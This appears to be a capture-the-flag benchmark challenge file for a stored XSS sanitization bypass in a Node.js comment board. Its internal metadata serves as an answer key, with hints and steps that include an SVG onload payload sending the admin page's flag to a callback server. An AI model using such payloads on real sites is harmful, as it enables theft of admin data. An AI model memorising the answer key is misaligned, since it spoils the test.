id: S7BEN-HARD-002
name: "XSS with Input Sanitization Bypass"
cve: N/A
version: "1.0.0"
difficulty: Hard
category: Injection

description: |
  A comment board application that sanitizes user-submitted content before storing
  and rendering it. An admin panel displays all submitted comments.

owasp_2025:
  category: A03
  name: Injection

vulnerabilities:
  - type: Cross-Site Scripting (XSS)
    category: Injection
    cwes:
      - CWE-79
      - CWE-116

objective: "Inject a payload that bypasses the sanitization layer and executes in the admin panel to retrieve the flag."

flag_format: "S7BEN{xss_[dynamic]}"
flag_dynamic: false

services:
  target:
    port: 3000
    protocol: http

hints: []

tags:
  - xss
  - sanitization-bypass
  - stored-xss
  - dompurify
  - web
  - nodejs

internal_metadata:
  exploitation_path:
    hints:
      - "The application uses a custom blacklist (blocks <script>, <iframe>, javascript:, event handlers) followed by DOMPurify"
      - "DOMPurify is configured with ALLOWED_TAGS including SVG elements"
      - "The ALLOWED_ATTR list includes event handler attributes (onload, onerror)"
      - "SVG tags with onload handlers bypass both the blacklist and DOMPurify's misconfigured allow-list"
      - "The flag is rendered on the /admin page"
    steps:
      - "POST /comment with standard payloads to map what is blocked"
      - "Discover that SVG tags are allowed through both filter layers"
      - "Craft payload: <svg onload=fetch('http://callback-server:8080/callback?d='+document.querySelector('.flag').textContent)>"
      - "POST the SVG payload via the comment form"
      - "GET /admin — payload executes on page load, exfiltrating the flag"

author: Strike7 Security Team
created: 2026-01-14
